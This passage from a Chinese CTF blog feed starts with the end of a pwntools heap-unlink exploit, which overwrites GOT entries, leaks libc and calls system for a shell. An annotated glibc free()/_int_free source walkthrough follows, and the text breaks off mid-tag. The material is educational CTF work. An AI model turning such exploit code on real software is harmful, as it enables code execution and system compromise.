number">0x10</span><span class="token punctuation">)</span>fake_chunk <span class="token operator">=</span> fake_head <span class="token operator">+</span> fake_fd <span class="token operator">+</span> fake_bkpadding <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x80</span><span class="token operator">-</span><span class="token number">0x20</span><span class="token punctuation">)</span>padding <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#chunk3_prev_size  </span>padding <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x90</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#chunk3_size</span>content <span class="token operator">=</span> fake_chunk <span class="token operator">+</span> paddingedit<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span>len<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#gdb.attach(sh)</span>delete<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#gdb.attach(sh)</span>content <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">0x10</span>content <span class="token operator">+=</span> p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'free'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>content <span class="token operator">+=</span> p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'atoi'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span>edit<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span>len<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#gdb.attach(sh,'b*0x0400A72')</span>edit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'printf'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#gdb.attach(sh)</span>delete<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'FAIL\n'</span><span class="token punctuation">)</span>atoi_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x00'</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token string">"atoi_addr ====>"</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>atoi_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>libc_L <span class="token operator">=</span> LibcSearcher<span class="token punctuation">(</span><span class="token string">'atoi'</span><span class="token punctuation">,</span>atoi_addr<span class="token punctuation">)</span>libc_L_addr <span class="token operator">=</span> atoi_addr <span class="token operator">-</span> libc_L<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'atoi'</span><span class="token punctuation">)</span>system_L_addr <span class="token operator">=</span> libc_L_addr <span class="token operator">+</span> libc_L<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'system'</span><span class="token punctuation">)</span>libc_addr <span class="token operator">=</span> atoi_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'atoi'</span><span class="token punctuation">]</span>system_addr <span class="token operator">=</span> libc_addr <span class="token operator">+</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span><span class="token keyword">print</span> <span class="token string">"system_addr =====>"</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#gdb.attach(sh)</span>edit<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>system_L_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>在unlink利用这里主要学到的是针对bss上存放指针的情况，然后就是 做堆题得有大局观，要留意高危漏洞像这里的无限读取</p>]]></content>
      
      
      <categories>
          
          <category> CTF-PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 原理学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>free函数关键源码分析</title>
      <link href="/2020/10/15/free-han-shu-guan-jian-yuan-ma-fen-xi/"/>
      <url>/2020/10/15/free-han-shu-guan-jian-yuan-ma-fen-xi/</url>
      
        <content type="html"><![CDATA[<p><strong>因为free源代码和malloc源码都是在malloc.c定义的，所以用到的宏几乎差不多这里就不列出来了，详情见上一篇文章：malloc关键源码分析</strong></p><h2 id="libc-free"><a href="#libc-free" class="headerlink" title="__libc_free"></a>__libc_free</h2><p>同malloc一样我们使用的free函数也是封装过的</p><pre class=" language-c"><code class="language-c"><span class="token keyword">void</span><span class="token function">__libc_free</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span>mem<span class="token punctuation">)</span><span class="token punctuation">{</span>  mstate ar_ptr<span class="token punctuation">;</span>  mchunkptr p<span class="token punctuation">;</span>                          <span class="token comment" spellcheck="true">/* chunk corresponding to mem */</span>  <span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span>hook<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>    <span class="token operator">=</span> <span class="token function">atomic_forced_read</span> <span class="token punctuation">(</span>__free_hook<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//检查钩子函数</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__builtin_expect</span> <span class="token punctuation">(</span>hook <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token punctuation">(</span><span class="token operator">*</span>hook<span class="token punctuation">)</span><span class="token punctuation">(</span>mem<span class="token punctuation">,</span> <span class="token function">RETURN_ADDRESS</span> <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>mem <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>      <span class="token comment" spellcheck="true">//free(0) 直接退出函数                        </span><span class="token comment" spellcheck="true">/* free(0) has no effect */</span>    <span class="token keyword">return</span><span class="token punctuation">;</span>  p <span class="token operator">=</span> <span class="token function">mem2chunk</span> <span class="token punctuation">(</span>mem<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//转换为对应chunk指针</span>  <span class="token comment" spellcheck="true">/*如果该chunk是mmaped，那么将会使用munmap(p)方案*/</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">chunk_is_mmapped</span> <span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">)</span>                       <span class="token comment" spellcheck="true">/* release mmapped memory. */</span>    <span class="token punctuation">{</span>      <span class="token comment" spellcheck="true">/* see if the dynamic brk/mmap threshold needs adjusting */</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>mp_<span class="token punctuation">.</span>no_dyn_threshold          <span class="token operator">&amp;&amp;</span> p<span class="token operator">-></span>size <span class="token operator">></span> mp_<span class="token punctuation">.</span>mmap_threshold          <span class="token operator">&amp;&amp;</span> p<span class="token operator">-></span>size <span class="token operator">&lt;=</span> DEFAULT_MMAP_THRESHOLD_MAX<span class="token punctuation">)</span>        <span class="token punctuation">{</span>          mp_<span class="token punctuation">.</span>mmap_threshold <span class="token operator">=</span> <span class="token function">chunksize</span> <span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span>          mp_<span class="token punctuation">.</span>trim_threshold <span class="token operator">=</span> <span class="token number">2</span> <span class="token operator">*</span> mp_<span class="token punctuation">.</span>mmap_threshold<span class="token punctuation">;</span>          <span class="token function">LIBC_PROBE</span> <span class="token punctuation">(</span>memory_mallopt_free_dyn_thresholds<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span>                      mp_<span class="token punctuation">.</span>mmap_threshold<span class="token punctuation">,</span> mp_<span class="token punctuation">.</span>trim_threshold<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>      <span class="token function">munmap_chunk</span> <span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//释放</span>      <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><p>如果不是mmaped_chunk则：</p><pre class=" language-c"><code class="language-c"><span class="token keyword">void</span><span class="token function">__libc_free</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span>mem<span class="token punctuation">)</span><span class="token punctuation">{</span>  mstate ar_ptr<span class="token punctuation">;</span>  mchunkptr p<span class="token punctuation">;</span>                          <span class="token comment" spellcheck="true">/* chunk corresponding to mem */</span>  <span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span>hook<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>    <span class="token operator">=</span> <span class="token function">atomic_forced_read</span> <span class="token punctuation">(</span>__free_hook<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//检查钩子函数</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__builtin_expect</span> <span class="token punctuation">(</span>hook <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token punctuation">(</span><span class="token operator">*</span>hook<span class="token punctuation">)</span><span class="token punctuation">(</span>mem<span class="token punctuation">,</span> <span class="token function">RETURN_ADDRESS</span> <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>mem <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>      <span class="token comment" spellcheck="true">//free(0) 直接退出函数                        </span><span class="token comment" spellcheck="true">/* free(0) has no effect */</span>    <span class="token keyword">return</span><span class="token punctuation">;</span>  p <span class="token operator">=</span> <span class="token function">mem2chunk</span> <span class="token punctuation">(</span>mem<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//转换为对应chunk指针</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">chunk_is_mmapped</span> <span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">)</span>                       <span class="token comment" spellcheck="true">/* release mmapped memory. */</span>    <span class="token punctuation">{</span>      <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>      <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>      <span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token punctuation">}</span>  ar_ptr <span class="token operator">=</span> <span class="token function">arena_for_chunk</span> <span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">//获取对应arena指针</span>  <span class="token function">_int_free</span> <span class="token punctuation">(</span>ar_ptr<span class="token punctuation">,</span> p<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//执行真正的释放函数</span><span class="token punctuation">}</span></code></pre><p><strong>所以libc_free 检查了：</strong></p><ul><li>钩子函数</li><li>mmaped</li></ul><h2 id="int-free"><a href="#int-free" class="headerlink" title="_int_free"></a>_int_free</h2><h3 id="数据声明"><a href="#数据声明" class="headerlink" title="数据声明"></a>数据声明</h3><pre class=" language-c"><code class="language-c"><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">_int_free</span><span class="token punctuation">(</span>mstate av<span class="token punctuation">,</span> mchunkptr p<span class="token punctuation">,</span> <span class="token keyword">int</span> have_lock<span class="token punctuation">)</span> <span class="token punctuation">{</span>    INTERNAL_SIZE_T size<span class="token punctuation">;</span>      <span class="token comment" spellcheck="true">/* its size */</span>    mfastbinptr <span class="token operator">*</span>   fb<span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">/* associated fastbin */</span>    mchunkptr       nextchunk<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">/* next contiguous chunk */</span>    INTERNAL_SIZE_T nextsize<span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">/* its size */</span>    <span class="token keyword">int</span>             nextinuse<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">/* true if nextchunk is used */</span>    INTERNAL_SIZE_T prevsize<span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">/* size of previous contiguous chunk */</span>    mchunkptr       bck<span class="token punctuation">;</span>       <span class="token comment" spellcheck="true">/* misc temp for linking */</span>    mchunkptr       fwd<span class="token punctuation">;</span>       <span class="token comment" spellcheck="true">/* misc temp for linking */</span>    <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>errstr <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>    <span class="token keyword">int</span>         locked <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    size <span class="token operator">=</span> <span class="token function">chunksize</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">//获取chunk p的size</span></code></pre><h3 id="检查chunk是否合理"><a href="#检查chunk是否合理" class="headerlink" title="检查chunk是否合理"></a>检查chunk是否合理</h3><pre class=" language-c"><code class="language-c">  <span class="token comment" spellcheck="true">/* Little security check which won't hurt performance: the     allocator never wrapps around at the end of the address space.     Therefore we can exclude some size values which might appear     here by accident or by "design" from some intruder.  */</span>     <span class="token comment" spellcheck="true">/*typedef unsigned long int    uintptr_t;适配*/</span>  <span class="token comment" spellcheck="true">/*1：p指向合法。2：p的大小对齐*/</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__builtin_expect</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>uintptr_t<span class="token punctuation">)</span> p <span class="token operator">></span> <span class="token punctuation">(</span>uintptr_t<span class="token punctuation">)</span> <span class="token operator">-</span>size<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>      <span class="token operator">||</span> <span class="token function">__builtin_expect</span> <span class="token punctuation">(</span><span class="token function">misaligned_chunk</span> <span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">//-size进行unsigned long int强制转换后是一个0xffff开头的数，如在64位下-0x90=====>0xffffffffffffff70</span>    <span class="token punctuation">{</span>                                                  <span class="token comment" spellcheck="true">//0x602000这是其chunk的地址</span>      errstr <span class="token operator">=</span> <span class="token string">"free(): invalid pointer"</span><span class="token punctuation">;</span>    errout<span class="token punctuation">:</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>have_lock <span class="token operator">&amp;&amp;</span> locked<span class="token punctuation">)</span>        <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> <span class="token function">mutex_unlock</span> <span class="token punctuation">(</span><span class="token operator">&amp;</span>av<span class="token operator">-></span>mutex<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">malloc_printerr</span> <span class="token punctuation">(</span>check_action<span class="token punctuation">,</span> errstr<span class="token punctuation">,</span> <span class="token function">chunk2mem</span> <span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">,</span> av<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token comment" spellcheck="true">/* We know that each chunk is at least MINSIZE bytes in size or a     multiple of MALLOC_ALIGNMENT.  */</span>     <span class="token comment" spellcheck="true">/*1：其size至少大于最小size 2：对齐*/</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__glibc_unlikely</span> <span class="token punctuation">(</span>size <span class="token operator">&lt;</span> MINSIZE <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">aligned_OK</span> <span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>      errstr <span class="token operator">=</span> <span class="token string">"free(): invalid size"</span><span class="token punctuation">;</span>      <span class="token keyword">goto</span> errout<span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><ul><li>p指向地址合法</li><li>size对齐且大于MINSIZE </li></ul><h3 id="看是否可以放入fastbins"><a href="#看是否可以放入fastbins" class="headerlink" title="看是否可以放入fastbins"></a>看是否可以放入fastbins</h3><pre class=" language-c"><code class="language-c">  <span class="token comment" spellcheck="true">/*    If eligible, place chunk on a fastbin so it can be found    and used quickly in malloc.  */</span>   <span class="token comment" spellcheck="true">/*如果size小于等于最大fastbins，则可以进行下面的操作*/</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token function">get_max_fast</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">//默认 #define TRIM_FASTBINS 0，因此默认情况下下面的语句不会执行</span><span class="token macro property">#<span class="token directive keyword">if</span> TRIM_FASTBINS</span>      <span class="token comment" spellcheck="true">/*    If TRIM_FASTBINS set, don't place chunks    bordering top into fastbins      */</span>      <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token function">chunk_at_offset</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span> size<span class="token punctuation">)</span> <span class="token operator">!=</span> av<span class="token operator">-></span>top<span class="token punctuation">)</span><span class="token macro property">#<span class="token directive keyword">endif</span></span>      <span class="token punctuation">)</span> <span class="token punctuation">{</span></code></pre><h3 id="放入fastbins"><a href="#放入fastbins" class="headerlink" title="放入fastbins"></a>放入fastbins</h3><h4 id="物理相邻下一个chunk进行大小检查"><a href="#物理相邻下一个chunk进行大小检查" class="headerlink" title="物理相邻下一个chunk进行大小检查"></a>物理相邻下一个chunk进行大小检查</h4><pre class=" language-c"><code class="language-c">    <span class="token comment" spellcheck="true">/*1：物理相邻下一个chunk不能过小，小于等于2 * SIZE_SZ 2：以及不能过大，大于system_mem*/</span>  <span class="token comment" spellcheck="true">//否则报错</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__builtin_expect</span> <span class="token punctuation">(</span><span class="token function">chunk_at_offset</span> <span class="token punctuation">(</span>p<span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token operator">-></span>size <span class="token operator">&lt;=</span> <span class="token number">2</span> <span class="token operator">*</span> SIZE_SZ<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>            <span class="token operator">||</span> <span class="token function">__builtin_expect</span> <span class="token punctuation">(</span><span class="token function">chunksize</span> <span class="token punctuation">(</span><span class="token function">chunk_at_offset</span> <span class="token punctuation">(</span>p<span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">)</span>                 <span class="token operator">>=</span> av<span class="token operator">-></span>system_mem<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>      <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">/* We might not have a lock at this point and concurrent modifications       of system_mem might have let to a false positive.  Redo the test       after getting the lock.  */</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>have_lock        <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token punctuation">{</span> <span class="token function">assert</span> <span class="token punctuation">(</span>locked <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">mutex_lock</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>av<span class="token operator">-></span>mutex<span class="token punctuation">)</span><span class="token punctuation">;</span>          locked <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>          <span class="token function">chunk_at_offset</span> <span class="token punctuation">(</span>p<span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token operator">-></span>size <span class="token operator">&lt;=</span> <span class="token number">2</span> <span class="token operator">*</span> SIZE_SZ            <span class="token operator">||</span> <span class="token function">chunksize</span> <span class="token punctuation">(</span><span class="token function">chunk_at_offset</span> <span class="token punctuation">(</span>p<span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">>=</span> av<span class="token operator">-></span>system_mem<span class="token punctuation">;</span>          <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span>      <span class="token punctuation">{</span>        errstr <span class="token operator">=</span> <span class="token string">"free(): invalid next size (fast)"</span><span class="token punctuation">;</span>        <span class="token keyword">goto</span> errout<span class="token punctuation">;</span>      <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span> have_lock<span class="token punctuation">)</span>      <span class="token punctuation">{</span>        <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token function">mutex_unlock</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>av<span class="token operator">-></span>mutex<span class="token punctuation">)</span><span class="token punctuation">;</span>        locked <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>      <span class="token punctuation">}</span></code></pre><p>检查：</p><ul><li>物理相邻下一个chunk &gt;= MINSIZE  ,且 &lt;= av-&gt;system_mem</li></ul><h4 id="插入对应链表"><a href="#插入对应链表" class="headerlink" title="插入对应链表"></a>插入对应链表</h4><pre class=" language-c"><code class="language-c">    <span class="token comment" spellcheck="true">/*调用perturb_byte来将data区的数据覆盖，但得看perturb_byte，一般是0，也就是不会进行memest*/</span>    <span class="token function">free_perturb</span> <span class="token punctuation">(</span><span class="token function">chunk2mem</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">,</span> size <span class="token operator">-</span> <span class="token number">2</span> <span class="token operator">*</span> SIZE_SZ<span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token comment" spellcheck="true">/*    static int perturb_byte;    ....    ...    static void    free_perturb (char *p, size_t n)    {      if (__glibc_unlikely (perturb_byte))        memset (p, perturb_byte, n);    }*/</span>    <span class="token function">set_fastchunks</span><span class="token punctuation">(</span>av<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">int</span> idx <span class="token operator">=</span> <span class="token function">fastbin_index</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">/*mfastbinptr *fb 是一个二级指针*/</span>    fb <span class="token operator">=</span> <span class="token operator">&amp;</span><span class="token function">fastbin</span> <span class="token punctuation">(</span>av<span class="token punctuation">,</span> idx<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//获取对应下标表头地址</span>    <span class="token comment" spellcheck="true">/* Atomically link P to its fastbin: P->FD = *FB; *FB = P;  */</span>    <span class="token comment" spellcheck="true">/*P->FD = *FB; *FB = P看这里就行下面两句看不懂 这里链接仅仅用了fd字段*/</span>    mchunkptr old <span class="token operator">=</span> <span class="token operator">*</span>fb<span class="token punctuation">,</span> old2<span class="token punctuation">;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">int</span> old_idx <span class="token operator">=</span> <span class="token operator">~</span><span class="token number">0u</span><span class="token punctuation">;</span>    <span class="token keyword">do</span>      <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">/* Check that the top of the bin is not the record we are going to add       (i.e., double free).  */</span>    <span class="token comment" spellcheck="true">/*原来表头fd所放的就是old，这里是防止连续两次free同一个chunk*/</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__builtin_expect</span> <span class="token punctuation">(</span>old <span class="token operator">==</span> p<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>      <span class="token punctuation">{</span>        errstr <span class="token operator">=</span> <span class="token string">"double free or corruption (fasttop)"</span><span class="token punctuation">;</span>        <span class="token keyword">goto</span> errout<span class="token punctuation">;</span>      <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">/* Check that size of fastbin chunk at the top is the same as       size of the chunk that we are adding.  We can dereference OLD       only if we have the lock, otherwise it might have already been       deallocated.  See use of OLD_IDX below for the actual check.  */</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>have_lock <span class="token operator">&amp;&amp;</span> old <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>      old_idx <span class="token operator">=</span> <span class="token function">fastbin_index</span><span class="token punctuation">(</span><span class="token function">chunksize</span><span class="token punctuation">(</span>old<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    p<span class="token operator">-></span>fd <span class="token operator">=</span> old2 <span class="token operator">=</span> old<span class="token punctuation">;</span>      <span class="token punctuation">}</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>old <span class="token operator">=</span> <span class="token function">catomic_compare_and_exchange_val_rel</span> <span class="token punctuation">(</span>fb<span class="token punctuation">,</span> p<span class="token punctuation">,</span> old2<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> old2<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>have_lock <span class="token operator">&amp;&amp;</span> old <span class="token operator">!=</span> <span class="token constant">NULL</span> <span class="token operator">&amp;&amp;</span> <span class="token function">__builtin_expect</span> <span class="token punctuation">(</span>old_idx <span class="token operator">!=</span> idx<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>      <span class="token punctuation">{</span>    errstr <span class="token operator">=</span> <span class="token string">"invalid fastbin entry (free)"</span><span class="token punctuation">;</span>    <span class="token keyword">goto</span> errout<span class="token punctuation">;</span>      <span class="token punctuation">}</span>  <span class="token punctuation">}</span></code></pre><p>要点：</p><ul><li>插入链表时，仅用fd构成单向链表</li><li>检查最新插入的chunk与old_chunk是不是同一个</li></ul><h3 id="不能放入fastbins就进行合并操作"><a href="#不能放入fastbins就进行合并操作" class="headerlink" title="不能放入fastbins就进行合并操作"></a>不能放入fastbins就进行合并操作</h3><h4 id="如果是mmaped-chunk"><a href="#如果是mmaped-chunk" class="headerlink" title="如果是mmaped chunk"></a>如果是mmaped chunk</h4><pre class=" language-c"><code class="language-c">  <span class="token comment" spellcheck="true">/*    Consolidate other non-mmapped chunks as they arrive 不能放入fastbins就进行合并操作.  */</span>  <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">chunk_is_mmapped</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span> have_lock<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token function">mutex_lock</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>av<span class="token operator">-></span>mutex<span class="token punctuation">)</span><span class="token punctuation">;</span>      locked <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span>  <span class="token comment" spellcheck="true">/*    If the chunk was allocated via mmap, release via munmap().  */</span>  <span class="token keyword">else</span> <span class="token punctuation">{</span>    <span class="token function">munmap_chunk</span> <span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">//直接用munmap 释放</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span>    </code></pre><h4 id="常规chunk，进行合并"><a 